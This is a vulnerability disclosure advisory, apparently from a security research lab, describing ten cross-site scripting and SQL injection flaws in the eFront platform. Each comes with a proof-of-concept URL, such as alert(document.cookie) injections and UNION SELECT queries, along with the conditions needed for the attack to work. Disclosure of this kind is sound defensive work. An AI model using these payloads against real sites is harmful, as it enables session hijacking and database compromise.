Vulnerability Details:
High-Tech Bridge SA Security Research Lab has discovered multiple vulnerabilities in Efront, which can be exploited to perform sql injection and cross-site scripting attacks.

1) Input passed via the "course" GET parameter to index.php is not properly sanitised before being returned to the user.
This can be exploited to execute arbitrary HTML and script code in a user's browser session in context of affected website.

The following PoC code is available:

http://[host]/index.php?ctg=lesson_info&lessons_ID=1&course=%27%20onmouseover%3dalert%28document.cookie%29%3E

2) Input appended to the URL after index.php is not properly sanitised before being returned to the user. 
This can be exploited to execute arbitrary HTML and script code in a user's browser session in context of an affected site

The following PoC is available:

http://[host]/index.php/%27%3E%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E

Successful exploitation of this vulnerability requires that Apache's directive "AcceptPathInfo" is set to "on" or "default" (default value is "default") 

3) Input passed via the "message_type" GET parameter to index.php is not properly sanitised before being returned to the user.
This can be exploited to execute arbitrary HTML and script code in a user's browser session in context of affected website.

The following PoC code is available:

http://[host]/index.php?message=1&message_type=%22%20onmouseover=alert%28document.cookie%29%3E

4) Input passed via the "user2" GET parameter to ask_information.php is not properly sanitised before being used in a SQL query.
This can be exploited to manipulate SQL queries by injecting arbitrary SQL code.

The following PoC code is available:

http://[host]/ask_information.php?common_lessons=1&user1=professor&user2=%27%20union%20select%201,version%28%29%20--%20

Successful exploitation of this vulnerability requires that "magic_quotes_gpc" is off.

5) Input passed via the "ctg" GET parameter to professor.php is not properly sanitised before being returned to the user.
This can be exploited to execute arbitrary HTML and script code in a user's browser session in context of affected website.

The following PoC code is available:

http://[host]/professor.php?ctg=%22%20onmouseover=%22alert%28document.cookie%29

6) Input passed via the "ctg" GET parameter to student.php is not properly sanitised before being returned to the user.
This can be exploited to execute arbitrary HTML and script code in a user's browser session in context of affected website.

The following PoC code is available:

http://[host]/student.php?ctg=%22%20onmouseover=%22alert%28document.cookie%29

7) Input passed via the "done_test_id" GET parameter to view_test.php is not properly sanitised before being used in a SQL query.
This can be exploited to manipulate SQL queries by injecting arbitrary SQL code.

The following PoC code is available:

http://[host]/view_test.php?done_test_id=1%20union%20select%201,2,%28select%20version%28%29%29,4,5,6,7,8,9,10,11,12%20--%20

Successful exploitation of this vulnerability requires attacker to be registered and logged-in.

8) Input passed via the "user" GET parameter to view_test.php is not properly sanitised before being used in a SQL query.
This can be exploited to manipulate SQL queries by injecting arbitrary SQL code.

The following PoC code is available:

http://[host]/view_test.php?test_id=1&user=%27SQL_CODE_HERE
http://[host]/view_test.php?content_id=2&user=%27SQL_CODE_HERE

Successful exploitation of this vulnerability requires that "magic_quotes_gpc" is off.

9) Input passed via the "ctg" GET parameter to administrator.php is not properly sanitised before being returned to the user.
This can be exploited to execute arbitrary HTML and script code in a user's browser session in context of affected website.

The following PoC code is available:

http://[host]/administrator.php?ctg=%22%20onmouseover=%22alert%28document.cookie%29

10) Input passed via the "loglessonid" GET parameter to /modules/module_chat/admin.php is not properly sanitised before being used in a SQL query.
This can be exploited to manipulate SQL queries by injecting arbitrary SQL code.

The following PoC code is available:

http://[host]/modules/module_chat/admin.php?force=getLessonFromId&loglessonid=-1%27%20union%20select%20version%28%29%20--%202

Successful exploitation of this vulnerability requires that "magic_quotes_gpc" is off.
